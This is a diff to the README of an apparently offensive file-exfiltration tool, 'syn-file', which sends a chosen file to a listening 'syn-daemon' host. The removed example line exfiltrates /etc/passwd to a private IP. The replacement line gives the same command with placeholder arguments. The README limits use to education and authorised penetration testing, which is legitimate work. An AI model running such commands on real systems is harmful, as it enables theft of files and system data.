@@ -67,7 +67,7 @@ gdm:x:478:477:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
 
 ###client (target)
 ```
-# ./syn-file -i eth0 -d 192.168.1.158 -f /etc/passwd -p 8080 -P 8081
+# ./syn-file -i interface -d dst_ip -f file_to_exfiltrate -p dst_port -P src_port
 -i interface
 -d destination ip / IP that runs syn-daemon
 -f file to exfiltrate
@@ -95,5 +95,7 @@ using interface: eth0
 Only use allowed for educational purposes or professionaly during a penetration test given the proper permission.
 
 All rights reserved
+
 (c) 2017 spinfoo
+
 Jacobo Avariento
